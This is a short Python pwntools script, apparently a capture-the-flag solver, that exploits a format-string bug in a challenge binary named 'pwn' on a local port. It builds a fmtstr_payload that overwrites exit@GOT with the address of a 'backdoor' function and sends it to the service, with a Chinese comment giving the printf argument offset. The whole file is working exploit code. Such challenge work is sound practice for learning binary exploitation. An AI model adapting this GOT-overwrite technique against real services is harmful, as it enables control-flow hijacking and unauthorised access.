#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
from pwn import *

HERE = os.path.dirname(os.path.abspath(__file__))
HOST = os.environ.get('HOST', '127.0.0.1')
PORT = int(os.environ.get('PORT', '9107'))

context(arch='amd64', os='linux', log_level='info')

elf = ELF(os.path.join(HERE, '..', 'files', 'pwn'))
exit_got = elf.got['exit']
backdoor = elf.symbols['backdoor']
log.info('exit@got = %#x -> backdoor = %#x', exit_got, backdoor)

p = remote(HOST, PORT)
p.recvuntil(b'name: ')
# buf 在 rbp-0x80，是 printf(buf) 的第 6 个位置参数
payload = fmtstr_payload(6, {exit_got: backdoor}, write_size='byte')
p.sendline(payload)
sys.stdout.buffer.write(p.recvall(timeout=4))
